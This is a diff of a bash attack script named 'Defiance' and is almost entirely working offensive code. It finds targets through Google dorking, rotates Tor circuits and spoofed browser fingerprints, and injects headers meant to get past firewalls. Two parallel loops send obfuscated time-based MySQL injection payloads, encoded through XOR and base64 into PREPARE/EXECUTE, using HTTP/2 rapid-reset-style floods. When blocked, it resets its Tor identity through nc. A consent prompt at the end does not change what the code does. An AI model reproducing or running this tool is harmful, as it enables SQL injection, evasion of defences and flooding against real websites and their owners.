@@ -10,430 +10,429 @@ export ROOT_LOG_FILE="$DEFIANCE_DIR/../targetDef.log"
 source "$DEFIANCE_DIR/../tamper/hungry.sh"
 # Killing all process related to this thing, since there's 2 vector. No no manual CTRL C.
 heyoii() {
-    trap - SIGINT SIGTERM EXIT
-    echo -e "\n\n\e[0;31m[\e[0m!\e[0;31m]\e[0m Interrupted. Killing all process.."
-    kill 0 2>/dev/null
-    exit 130
+  trap - SIGINT SIGTERM EXIT
+  echo -e "\n\n\e[0;31m[\e[0m!\e[0;31m]\e[0m Interrupted. Killing all process.."
+  kill 0 2>/dev/null
+  exit 130
 }
 
 trap 'heyoii' SIGINT SIGTERM
 
 if [ -n "$custom_proxy" ]; then
-    export TOR_CIRCUITS=("$custom_proxy")
+  export TOR_CIRCUITS=("$custom_proxy")
 else
-    export TOR_CIRCUITS=(9050 9052 9054 9056 9058 9060)
+  export TOR_CIRCUITS=(9050 9052 9054 9056 9058 9060)
 fi
 # Random agent Array here.
 export DEFIANCE_UA=(
-    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36"
-    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36"
-    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0"
-    "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Mobile Safari/537.36"
-    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.3 Mobile/15E148 Safari/605.1.15"
-    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36"
+"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36"
+"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36"
+"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0"
+"Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Mobile Safari/537.36"
+"Mozilla/5.0 (iPhone; CPU iPhone OS 17_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.3 Mobile/15E148 Safari/605.1.15"
+"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36"
 )
 # logo
 print_defiance_logo(){
-echo -e "                \e[38;5;18m▄\e[0m"
-    echo -e "              \e[38;5;18m▄██\e[0m"
-    echo -e "            \e[38;5;18m▄██\e[38;5;21m█▀\e[0m"
-    echo -e "          \e[38;5;18m▄██\e[38;5;21m▄██\e[38;5;27m█▀\e[0m"
-    echo -e "        \e[38;5;18m▄██\e[38;5;21m▄██\e[38;5;27m▄██\e[38;5;39m█▀\e[0m          \e[38;5;39m____        ______                 \e[0m"
-    echo -e "      \e[38;5;18m▄██\e[38;5;21m▄██\e[38;5;27m▄██\e[38;5;39m▄██\e[38;5;45m█▀\e[0m         \e[38;5;45m/  _/___ ___ / ____/_  _____   __    \e[0m"
-    echo -e "    \e[38;5;18m▄██\e[38;5;21m▄██\e[38;5;27m▄██\e[38;5;39m▄██\e[38;5;45m▄██\e[38;5;51m█▀\e[0m        \e[38;5;51m/ // __ \`__ \/ /   / / / / ___/ \ \ / /    \e[0m"
-    echo -e "  \e[38;5;18m▄██\e[38;5;21m▄██\e[38;5;27m▄██\e[38;5;39m▄██\e[38;5;45m▄██\e[38;5;51m▄██\e[38;5;15m██\e[0m      \e[38;5;51m_/ // / / / / / /___/ /_/ / /     \ V /     \e[0m"
-    echo -e "  \e[38;5;18m▀██\e[38;5;21m▀██\e[38;5;27m▀██\e[38;5;39m▀██\e[38;5;45m▀██\e[38;5;51m▀██\e[38;5;15m██\e[0m     \e[38;5;51m/___/_/ /_/ /_/\____/\__,_/_/       \_/      \e[0m"
-    echo -e "    \e[38;5;18m▀██\e[38;5;21m▀██\e[38;5;27m▀██\e[38;5;39m▀██\e[38;5;45m▀██\e[38;5;51m█▄\e[0m"
-    echo -e "      \e[38;5;18m▀██\e[38;5;21m▀██\e[38;5;27m▀██\e[38;5;39m▀██\e[38;5;45m█▄\e[0m"
-    echo -e "        \e[38;5;18m▀██\e[38;5;21m▀██\e[38;5;27m▀██\e[38;5;39m█▄\e[0m"
-    echo -e "          \e[38;5;18m▀██\e[38;5;21m▀██\e[38;5;27m█▄\e[0m"
-    echo -e "            \e[38;5;18m▀██\e[38;5;21m█▄\e[0m"
-    echo -e "              \e[38;5;18m▀██\e[0m"
-    echo -e "                \e[38;5;18m▀\e[0m"                                 
-echo -e "\e[0;37m[\e[0;31m!\e[0;37m]\e[0m ImCurvin in the curve ;]"
-    if [ -n "$custom_proxy" ]; then
-        echo -e "\e[0;31m[\e[0m!\e[0;31m]\e[0m Routing via $custom_proxy"
-    fi
+  echo -e "                \e[38;5;18m▄\e[0m"
+  echo -e "              \e[38;5;18m▄██\e[0m"
+  echo -e "            \e[38;5;18m▄██\e[38;5;21m█▀\e[0m"
+  echo -e "          \e[38;5;18m▄██\e[38;5;21m▄██\e[38;5;27m█▀\e[0m"
+  echo -e "        \e[38;5;18m▄██\e[38;5;21m▄██\e[38;5;27m▄██\e[38;5;39m█▀\e[0m          \e[38;5;39m____        ______                 \e[0m"
+  echo -e "      \e[38;5;18m▄██\e[38;5;21m▄██\e[38;5;27m▄██\e[38;5;39m▄██\e[38;5;45m█▀\e[0m         \e[38;5;45m/  _/___ ___ / ____/_  _____   __    \e[0m"
+  echo -e "    \e[38;5;18m▄██\e[38;5;21m▄██\e[38;5;27m▄██\e[38;5;39m▄██\e[38;5;45m▄██\e[38;5;51m█▀\e[0m        \e[38;5;51m/ // __ \`__ \/ /   / / / / ___/ \ \ / /    \e[0m"
+  echo -e "  \e[38;5;18m▄██\e[38;5;21m▄██\e[38;5;27m▄██\e[38;5;39m▄██\e[38;5;45m▄██\e[38;5;51m▄██\e[38;5;15m██\e[0m      \e[38;5;51m_/ // / / / / / /___/ /_/ / /     \ V /     \e[0m"
+  echo -e "  \e[38;5;18m▀██\e[38;5;21m▀██\e[38;5;27m▀██\e[38;5;39m▀██\e[38;5;45m▀██\e[38;5;51m▀██\e[38;5;15m██\e[0m     \e[38;5;51m/___/_/ /_/ /_/\____/\__,_/_/       \_/      \e[0m"
+  echo -e "    \e[38;5;18m▀██\e[38;5;21m▀██\e[38;5;27m▀██\e[38;5;39m▀██\e[38;5;45m▀██\e[38;5;51m█▄\e[0m"
+  echo -e "      \e[38;5;18m▀██\e[38;5;21m▀██\e[38;5;27m▀██\e[38;5;39m▀██\e[38;5;45m█▄\e[0m"
+  echo -e "        \e[38;5;18m▀██\e[38;5;21m▀██\e[38;5;27m▀██\e[38;5;39m█▄\e[0m"
+  echo -e "          \e[38;5;18m▀██\e[38;5;21m▀██\e[38;5;27m█▄\e[0m"
+  echo -e "            \e[38;5;18m▀██\e[38;5;21m█▄\e[0m"
+  echo -e "              \e[38;5;18m▀██\e[0m"
+  echo -e "                \e[38;5;18m▀\e[0m"
+  echo -e "\e[0;37m[\e[0;31m!\e[0;37m]\e[0m ImCurvin in the curve ;]"
+  if [ -n "$custom_proxy" ]; then
+    echo -e "\e[0;31m[\e[0m!\e[0;31m]\e[0m Routing via $custom_proxy"
+  fi
 }
 # HTTP pollution, air pollution.
 # Told waf that this is JSON lol.
 braindamage() {
-    local choice=$((RANDOM % 3))
-    local cf_ray=$(cat /dev/urandom | tr -dc 'a-f0-9' | fold -w 16 | head -n 1)
-    if [[ "$target_url" == *"?"* ]]; then
-        case "$choice" in
-            0) echo "-H Content-Type:application/json -H X-Forwarded-For:127.0.0.1 -H CF-Connecting-IP:172.67.$((RANDOM % 254 + 1)).$((RANDOM % 254 + 1)) -H CF-RAY:${cf_ray}-CGK" ;;
-1) echo "-H Content-Type:application/json -H CF-Visitor:{\"scheme\":\"https\"}" ;;
-2) echo "-H Content-Type:application/json -H X-WAF-Bypass:True -H CF-IPCountry:US -H True-Client-IP:103.21.244.$((RANDOM % 254 + 1))" ;;
+  local choice=$((RANDOM % 3))
+  local cf_ray=$(cat /dev/urandom | tr -dc 'a-f0-9' | fold -w 16 | head -n 1)
+  if [[ "$target_url" == *"?"* ]]; then
+    case "$choice" in
+      0) echo "-H Content-Type:application/json -H X-Forwarded-For:127.0.0.1 -H CF-Connecting-IP:172.67.$((RANDOM % 254 + 1)).$((RANDOM % 254 + 1)) -H CF-RAY:${cf_ray}-CGK" ;;
+      1) echo "-H Content-Type:application/json -H CF-Visitor:{\"scheme\":\"https\"}" ;;
+      2) echo "-H Content-Type:application/json -H X-WAF-Bypass:True -H CF-IPCountry:US -H True-Client-IP:103.21.244.$((RANDOM % 254 + 1))" ;;
 
-        esac
-    else
-        case "$choice" in
-            0) echo "-H Content-Type:application/json -H Authorization:Bearer $cf_ray -H X-WAF-Bypass:True -H CF-IPCountry:US" ;;
-1) echo "-H Content-Type:application/json -H X-Requested-With:XMLHttpRequest -H CF-RAY:${cf_ray}-CGK -H True-Client-IP:103.21.244.$((RANDOM % 254 + 1))" ;;
-2) echo "-H Content-Type:application/json -H Cache-Control:no-cache,no-store -H Pragma:no-cache -H X-Forwarded-For:127.0.0.1" ;;
-        esac
-    fi
+    esac
+  else
+    case "$choice" in
+      0) echo "-H Content-Type:application/json -H Authorization:Bearer $cf_ray -H X-WAF-Bypass:True -H CF-IPCountry:US" ;;
+      1) echo "-H Content-Type:application/json -H X-Requested-With:XMLHttpRequest -H CF-RAY:${cf_ray}-CGK -H True-Client-IP:103.21.244.$((RANDOM % 254 + 1))" ;;
+      2) echo "-H Content-Type:application/json -H Cache-Control:no-cache,no-store -H Pragma:no-cache -H X-Forwarded-For:127.0.0.1" ;;
+    esac
+  fi
 }
 # dork, goofle dorking. I mean google.
 dork() {
-    local dom="$1"
-    echo -e "[i] Launching Universal Google Dorking..."
-    sleep 2
+  local dom="$1"
+  echo -e "[i] Launching Universal Google Dorking..."
+  sleep 2
 
-    local gerbang=${TOR_CIRCUITS[$RANDOM % ${#TOR_CIRCUITS[@]}]}
+  local gerbang=${TOR_CIRCUITS[$RANDOM % ${#TOR_CIRCUITS[@]}]}
     if [ -n "$custom_proxy" ]; then local prx="-x $gerbang"; else local prx="--socks5-hostname 127.0.0.1:$gerbang"; fi
     local samaran=${DEFIANCE_UA[$RANDOM % ${#DEFIANCE_UA[@]}]}
-    # fork, i mean dork. Search search lofin, i mena login. *mean.
-    local q="site:${dom} (intitle:\"login\" inurl:\"login\") OR inurl:search OR inurl:api OR inurl:v1"
-    local enc=$(python3 -c "import urllib.parse; print(urllib.parse.quote('''$q'''))")
-    local raw=$(curl $prx -s -m 10 -A "$samaran" "https://google.com/search?q=${enc}&gbv=1")
+      # fork, i mean dork. Search search lofin, i mena login. *mean.
+      local q="site:${dom} (intitle:\"login\" inurl:\"login\") OR inurl:search OR inurl:api OR inurl:v1"
+      local enc=$(python3 -c "import urllib.parse; print(urllib.parse.quote('''$q'''))")
+      local raw=$(curl $prx -s -m 10 -A "$samaran" "https://google.com/search?q=${enc}&gbv=1")
 
-    local -a list
-    while read -r line; do
+      local -a list
+      while read -r line; do
         if [[ -n "$line" ]]; then
-            local decoded_line=$(python3 -c "import urllib.parse; print(urllib.parse.unquote('''$line'''))")
-            list+=("$decoded_line")
+          local decoded_line=$(python3 -c "import urllib.parse; print(urllib.parse.unquote('''$line'''))")
+          list+=("$decoded_line")
         fi
-    done < <(echo "$raw" | grep -oP '(?<=url\?q=)[^&]*' | grep "$dom" | sort -u | head -n 4)
+      done < <(echo "$raw" | grep -oP '(?<=url\?q=)[^&]*' | grep "$dom" | sort -u | head -n 4)
 
-    if [ ${#list[@]} -eq 0 ]; then
+      if [ ${#list[@]} -eq 0 ]; then
         echo -e "\e[0;33m[-]\e[0m No links found on Google Index."
         return 1
-    fi
+      fi
 
-    echo -e "\n\e[0;32m[+]\e[0m Top 4 Discovered Targets:"
-    for i in "${!list[@]}"; do
+      echo -e "\n\e[0;32m[+]\e[0m Top 4 Discovered Targets:"
+      for i in "${!list[@]}"; do
         echo -e "[\e[1;34m$((i+1))\e[0m] ${list[$i]}"
-    done
+      done
 
-    echo -n -e "\n\e[0;32m[?]\e[0m Select target (1-4) or 's' to skip: "
-    read -r -n 1 sel
-    echo ""
+      echo -n -e "\n\e[0;32m[?]\e[0m Select target (1-4) or 's' to skip: "
+      read -r -n 1 sel
+      echo ""
 
-    if [[ "$sel" =~ ^[1-4]$ ]]; then
+      if [[ "$sel" =~ ^[1-4]$ ]]; then
         local idx=$((sel - 1))
         export target_url="${list[$idx]}"
         echo -e "\e[0;32m[+]\e[0m Locked on: \e[1;34m$target_url\e[0m"
         return 0
-    else
+      else
         echo -e "[i] Proceeding with default input."
         return 2
-    fi
-}
-# 1st Vector func.
-vector_sqli_agressor_left() {
-    while IFS='|' read -r default_path query_payload || [ -n "$query_payload" ]; do
+      fi
+    }
+    # 1st Vector func.
+    vector_sqli_agressor_left() {
+      while IFS='|' read -r default_path query_payload || [ -n "$query_payload" ]; do
         [[ -z "$default_path" ]] && continue
 
         local random_port=${TOR_CIRCUITS[$RANDOM % ${#TOR_CIRCUITS[@]}]}
-        local proxy_flag=""
-        if [ -n "$custom_proxy" ]; then
+          local proxy_flag=""
+          if [ -n "$custom_proxy" ]; then
             proxy_flag="-x $random_port --fail"
-        else
+          else
             proxy_flag="--socks5-hostname 127.0.0.1:$random_port --socks5-gssapi-nec --fail"
-        fi
+          fi
 
-        local base_ua="${DEFIANCE_UA[$RANDOM % ${#DEFIANCE_UA[@]}]}"
-        local random_ua="$base_ua"
-        local ua_salt=$(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 8 | head -n 1)
-       
-local target_cipher=""
-        local target_tls13=""
-local rapid_reset_args="--http2 --parallel --parallel-max 50"
-        local chunked_headers="-H \"Transfer-Encoding: chunked\" -H \"Content-Type: application/x-www-form-urlencoded\""
-        if [[ "$base_ua" == *"Firefox"* ]]; then
-           
+          local base_ua="${DEFIANCE_UA[$RANDOM % ${#DEFIANCE_UA[@]}]}"
+          local random_ua="$base_ua"
+          local ua_salt=$(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 8 | head -n 1)
+
+          local target_cipher=""
+          local target_tls13=""
+          local rapid_reset_args="--http2 --parallel --parallel-max 50"
+          local chunked_headers="-H \"Transfer-Encoding: chunked\" -H \"Content-Type: application/x-www-form-urlencoded\""
+          if [[ "$base_ua" == *"Firefox"* ]]; then
+
             random_ua="${base_ua} Gecko/20100101 Firefox/$((RANDOM % 5 + 125)).0 Build/${ua_salt}"
             target_cipher="ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-CHACHA20-POLY1305"
             target_tls13="TLS_AES_128_GCM_SHA256:TLS_CHACHA20_POLY1305_SHA256"
 
-        elif [[ "$base_ua" == *"iPhone"* ]]; then
+          elif [[ "$base_ua" == *"iPhone"* ]]; then
             random_ua="${base_ua} Mobile/15E148 Safari/605.1.15 Kustom/${ua_salt}"
             target_cipher="ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES256-GCM-SHA384"
             target_tls13="TLS_AES_128_GCM_SHA256:TLS_AES_256_GCM_SHA384"
 
-        else
+          else
 
             random_ua="${base_ua} Chrome/$((RANDOM % 10 + 120)).0.$((RANDOM % 999 + 1000)).$((RANDOM % 99)) Safari/537.36 Build/${ua_salt}"
             target_cipher="ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384"
             target_tls13="TLS_AES_128_GCM_SHA256:TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256"
-        fi
-        local defiance_tamper_path=""
-        local final_query=""
-        local raw_payload="$query_payload"
-local t2=$(randomcase_engine "$raw_payload")
-local t4=$(space2comment_engine "$t2")
-        local hex_xor=$(xor_engine "$t4") 
-        local b64_payload=$(base64_engine "$hex_xor")
-        defiance_tamper_path="'; SET @s=FROM_BASE64('${b64_payload}'); PREPARE stmt FROM @s; EXECUTE stmt;--"
+          fi
+          local defiance_tamper_path=""
+          local final_query=""
+          local raw_payload="$query_payload"
+          local t2=$(randomcase_engine "$raw_payload")
+          local t4=$(space2comment_engine "$t2")
+          local hex_xor=$(xor_engine "$t4")
+          local b64_payload=$(base64_engine "$hex_xor")
+          defiance_tamper_path="'; SET @s=FROM_BASE64('${b64_payload}'); PREPARE stmt FROM @s; EXECUTE stmt;--"
 
-
-        if [[ "$WORDLIST_MYSQL" == *"nonphp"* || "$WORDLIST_MYSQL" == *"HAHA"* ]]; then
+          if [[ "$WORDLIST_MYSQL" == *"nonphp"* || "$WORDLIST_MYSQL" == *"HAHA"* ]]; then
             final_query="${default_path}${defiance_tamper_path}"
-        else
+          else
             if [[ "$defiance_tamper_path" == *"="* ]]; then
-                local param_name=$(echo "$defiance_tamper_path" | cut -d'=' -f1)
-                local param_val=$(echo "$defiance_tamper_path" | cut -d'=' -f2-)
-                final_query="${default_path}${param_name}=999&${param_name}=${param_val}${query_payload}"
+              local param_name=$(echo "$defiance_tamper_path" | cut -d'=' -f1)
+              local param_val=$(echo "$defiance_tamper_path" | cut -d'=' -f2-)
+              final_query="${default_path}${param_name}=999&${param_name}=${param_val}${query_payload}"
             else
-                final_query="${default_path}${defiance_tamper_path}"
+              final_query="${default_path}${defiance_tamper_path}"
             fi
-        fi
+          fi
 
-        local waf_trick=$(braindamage)
-        echo -e "\e[0;34m[\e[0m<\e[0;34m]\e[0m Vector 1 [Port:$random_port] Probing Latency on: \e[38;5;236m${target_url}${final_query}\e[0m"
-curl_output=$(echo -n "${param_name}=999&${param_name}=${param_val}${query_payload}" | \
+          local waf_trick=$(braindamage)
+          echo -e "\e[0;34m[\e[0m<\e[0;34m]\e[0m Vector 1 [Port:$random_port] Probing Latency on: \e[38;5;236m${target_url}${final_query}\e[0m"
+          curl_output=$(echo -n "${param_name}=999&${param_name}=${param_val}${query_payload}" | \
             curl $proxy_flag $waf_trick $rapid_reset_args $chunked_headers \
             --tlsv1.3 --ciphers "$target_cipher" --tls13-ciphers "$target_tls13" \
             -m 12 -A "$random_ua" -s -o /dev/null -d @- \
             -w "%{time_total}|%{http_code}" \
             "${target_url}${default_path}" "${target_url}${default_path}")
-        local stopwatch=$(echo "$curl_output" | cut -d'|' -f1)
-        local http_status=$(echo "$curl_output" | cut -d'|' -f2)
+          local stopwatch=$(echo "$curl_output" | cut -d'|' -f1)
+          local http_status=$(echo "$curl_output" | cut -d'|' -f2)
 
-        if [[ "$http_status" == "403" || "$http_status" == "429" ]]; then
+          if [[ "$http_status" == "403" || "$http_status" == "429" ]]; then
             echo -e "\e[0;33m[!]\e[0m Port $random_port Shadowbanned (HTTP $http_status). Rotating TOR IP Circuit..."
             (echo "AUTHENTICATE \"\""; echo "SIGNAL NEWNYM"; echo "QUIT") | nc 127.0.0.1 9051 >/dev/null 2>&1
             sleep 1
-        fi
+          fi
 
-        if [[ -n "$stopwatch" && "$stopwatch" != "0.000000" ]]; then
+          if [[ -n "$stopwatch" && "$stopwatch" != "0.000000" ]]; then
             if (( $(echo "$stopwatch > 4.0" | bc -l) )); then
-                echo -e "\e[0;31m[×]\e[0m Vector 1 confirmed MySQL Anomaly: ${stopwatch}s"
-                echo "SQLI_ALERT|$default_path|$query_payload" >> "$ROOT_LOG_FILE"
+              echo -e "\e[0;31m[×]\e[0m Vector 1 confirmed MySQL Anomaly: ${stopwatch}s"
+              echo "SQLI_ALERT|$default_path|$query_payload" >> "$ROOT_LOG_FILE"
             fi
-        fi
-        
-        sleep $((RANDOM % 6 + 4))
-    done < <(shuf "$WORDLIST_MYSQL")
-}
-vector_sqli_agressor_right() {
-    while IFS='|' read -r default_path query_payload || [ -n "$query_payload" ]; do
-        [[ -z "$default_path" ]] && continue
+          fi
 
-        local random_port=${TOR_CIRCUITS[$RANDOM % ${#TOR_CIRCUITS[@]}]}
-        local proxy_flag=""
-        if [ -n "$custom_proxy" ]; then
-            proxy_flag="-x $random_port --fail"
-        else
-            proxy_flag="--socks5-hostname 127.0.0.1:$random_port --socks5-gssapi-nec --fail"
-        fi
+          sleep $((RANDOM % 6 + 4))
+        done < <(shuf "$WORDLIST_MYSQL")
+      }
+      vector_sqli_agressor_right() {
+        while IFS='|' read -r default_path query_payload || [ -n "$query_payload" ]; do
+          [[ -z "$default_path" ]] && continue
 
-        local base_ua="${DEFIANCE_UA[$RANDOM % ${#DEFIANCE_UA[@]}]}"
-        local random_ua="$base_ua"
-        local ua_salt=$(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 8 | head -n 1)
-        local target_cipher=""
-        local target_tls13=""
-local rapid_reset_args="--http2 --parallel --parallel-max 50"
-        local chunked_headers="-H \"Transfer-Encoding: chunked\" -H \"Content-Type: application/x-www-form-urlencoded\""
-        if [[ "$base_ua" == *"Firefox"* ]]; then
-            random_ua="${base_ua} Gecko/20100101 Firefox/$((RANDOM % 5 + 125)).0 Build/${ua_salt}"
-            target_cipher="ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-CHACHA20-POLY1305"
-            target_tls13="TLS_AES_128_GCM_SHA256:TLS_CHACHA20_POLY1305_SHA256"
+          local random_port=${TOR_CIRCUITS[$RANDOM % ${#TOR_CIRCUITS[@]}]}
+            local proxy_flag=""
+            if [ -n "$custom_proxy" ]; then
+              proxy_flag="-x $random_port --fail"
+            else
+              proxy_flag="--socks5-hostname 127.0.0.1:$random_port --socks5-gssapi-nec --fail"
+            fi
 
-        elif [[ "$base_ua" == *"iPhone"* ]]; then
-            random_ua="${base_ua} Mobile/15E148 Safari/605.1.15 Kustom/${ua_salt}"
-            target_cipher="ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES256-GCM-SHA384"
-            target_tls13="TLS_AES_128_GCM_SHA256:TLS_AES_256_GCM_SHA384"
+            local base_ua="${DEFIANCE_UA[$RANDOM % ${#DEFIANCE_UA[@]}]}"
+            local random_ua="$base_ua"
+            local ua_salt=$(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 8 | head -n 1)
+            local target_cipher=""
+            local target_tls13=""
+            local rapid_reset_args="--http2 --parallel --parallel-max 50"
+            local chunked_headers="-H \"Transfer-Encoding: chunked\" -H \"Content-Type: application/x-www-form-urlencoded\""
+            if [[ "$base_ua" == *"Firefox"* ]]; then
+              random_ua="${base_ua} Gecko/20100101 Firefox/$((RANDOM % 5 + 125)).0 Build/${ua_salt}"
+              target_cipher="ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-CHACHA20-POLY1305"
+              target_tls13="TLS_AES_128_GCM_SHA256:TLS_CHACHA20_POLY1305_SHA256"
 
-        else
-            random_ua="${base_ua} Chrome/$((RANDOM % 10 + 120)).0.$((RANDOM % 999 + 1000)).$((RANDOM % 99)) Safari/537.36 Build/${ua_salt}"
-            target_cipher="ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384"
-            target_tls13="TLS_AES_128_GCM_SHA256:TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256"
-        fi
+            elif [[ "$base_ua" == *"iPhone"* ]]; then
+              random_ua="${base_ua} Mobile/15E148 Safari/605.1.15 Kustom/${ua_salt}"
+              target_cipher="ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES256-GCM-SHA384"
+              target_tls13="TLS_AES_128_GCM_SHA256:TLS_AES_256_GCM_SHA384"
 
-        local defiance_tamper_path=""
-        local final_query=""
-        local raw_payload="$query_payload"
-local t2=$(randomcase_engine "$raw_payload")
-local t4=$(space2comment_engine "$t2")
-        local hex_xor=$(xor_engine "$t4") 
-        local b64_payload=$(base64_engine "$hex_xor")
-        defiance_tamper_path="'; SET @s=FROM_BASE64('${b64_payload}'); PREPARE stmt FROM @s; EXECUTE stmt;--"
+            else
+              random_ua="${base_ua} Chrome/$((RANDOM % 10 + 120)).0.$((RANDOM % 999 + 1000)).$((RANDOM % 99)) Safari/537.36 Build/${ua_salt}"
+              target_cipher="ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384"
+              target_tls13="TLS_AES_128_GCM_SHA256:TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256"
+            fi
 
-                if [[ "$WORDLIST_MYSQL" == *"nonphp"* || "$WORDLIST_MYSQL" == *"HAHA"* ]]; then
-            final_query="${default_path}${defiance_tamper_path}"
-        else
-            if [[ "$defiance_tamper_path" == *"="* ]]; then
+            local defiance_tamper_path=""
+            local final_query=""
+            local raw_payload="$query_payload"
+            local t2=$(randomcase_engine "$raw_payload")
+            local t4=$(space2comment_engine "$t2")
+            local hex_xor=$(xor_engine "$t4")
+            local b64_payload=$(base64_engine "$hex_xor")
+            defiance_tamper_path="'; SET @s=FROM_BASE64('${b64_payload}'); PREPARE stmt FROM @s; EXECUTE stmt;--"
+
+            if [[ "$WORDLIST_MYSQL" == *"nonphp"* || "$WORDLIST_MYSQL" == *"HAHA"* ]]; then
+              final_query="${default_path}${defiance_tamper_path}"
+            else
+              if [[ "$defiance_tamper_path" == *"="* ]]; then
                 local param_name=$(echo "$defiance_tamper_path" | cut -d'=' -f1)
                 local param_val=$(echo "$defiance_tamper_path" | cut -d'=' -f2-)
                 final_query="${default_path}${param_name}=999&${param_name}=${param_val}${query_payload}"
-            else
+              else
                 final_query="${default_path}${defiance_tamper_path}"
+              fi
             fi
-        fi
-        local waf_trick=$(braindamage)
-        
-        echo -e "\e[0;34m[\e[0m>\e[0;34m]\e[0m Vector 2 [Port:$random_port] Probing Latency on: \e[38;5;236m${target_url}${final_query}\e[0m"
+            local waf_trick=$(braindamage)
 
-curl_output=$(echo -n "${param_name}=999&${param_name}=${param_val}${query_payload}" | \
-            curl $proxy_flag $waf_trick $rapid_reset_args $chunked_headers \
-            --tlsv1.3 --ciphers "$target_cipher" --tls13-ciphers "$target_tls13" \
-            -m 12 -A "$random_ua" -s -o /dev/null -d @- \
-            -w "%{time_total}|%{http_code}" \
-            "${target_url}${default_path}" "${target_url}${default_path}")
-        local stopwatch=$(echo "$curl_output" | cut -d'|' -f1)
-        local http_status=$(echo "$curl_output" | cut -d'|' -f2)
+            echo -e "\e[0;34m[\e[0m>\e[0;34m]\e[0m Vector 2 [Port:$random_port] Probing Latency on: \e[38;5;236m${target_url}${final_query}\e[0m"
 
-        if [[ "$http_status" == "403" || "$http_status" == "429" ]]; then
-            echo -e "\e[0;33m[!]\e[0m Port $random_port Shadowbanned (HTTP $http_status). Rotating TOR IP Circuit..."
-            (echo "AUTHENTICATE \"\""; echo "SIGNAL NEWNYM"; echo "QUIT") | nc 127.0.0.1 9051 >/dev/null 2>&1
-            sleep 1
-        fi
+            curl_output=$(echo -n "${param_name}=999&${param_name}=${param_val}${query_payload}" | \
+              curl $proxy_flag $waf_trick $rapid_reset_args $chunked_headers \
+              --tlsv1.3 --ciphers "$target_cipher" --tls13-ciphers "$target_tls13" \
+              -m 12 -A "$random_ua" -s -o /dev/null -d @- \
+              -w "%{time_total}|%{http_code}" \
+              "${target_url}${default_path}" "${target_url}${default_path}")
+            local stopwatch=$(echo "$curl_output" | cut -d'|' -f1)
+            local http_status=$(echo "$curl_output" | cut -d'|' -f2)
 
-        if [[ -n "$stopwatch" && "$stopwatch" != "0.000000" ]]; then
-            if (( $(echo "$stopwatch > 4.0" | bc -l) )); then
+            if [[ "$http_status" == "403" || "$http_status" == "429" ]]; then
+              echo -e "\e[0;33m[!]\e[0m Port $random_port Shadowbanned (HTTP $http_status). Rotating TOR IP Circuit..."
+              (echo "AUTHENTICATE \"\""; echo "SIGNAL NEWNYM"; echo "QUIT") | nc 127.0.0.1 9051 >/dev/null 2>&1
+              sleep 1
+            fi
+
+            if [[ -n "$stopwatch" && "$stopwatch" != "0.000000" ]]; then
+              if (( $(echo "$stopwatch > 4.0" | bc -l) )); then
                 echo -e "\e[0;31m[×]\e[0m Vector 2 confirmed MySQL Anomaly: ${stopwatch}s"
                 echo "SQLI_ALERT|$default_path|$query_payload" >> "$ROOT_LOG_FILE"
+              fi
             fi
+
+            sleep $((RANDOM % 6 + 4))
+          done < <(shuf "$WORDLIST_MYSQL")
+        }
+
+        clear
+        print_defiance_logo
+        echo -e "\n\e[0;31m[\e[0m!\e[0;37m]\e[0m \e[1;31mLEGAL WARNING 1/2:\e[0m Defiance Mode fires a multivector parallel network flood."
+        echo -e "Executing this mode against unauthorized infrastructures strictly violates cyber laws."
+        echo -n -e "\e[0;33m[\e[0m?\e[0;37m]\e[0m Do you have explicit written consent from the target owner? (YES/no): "
+        read -r legal_1
+
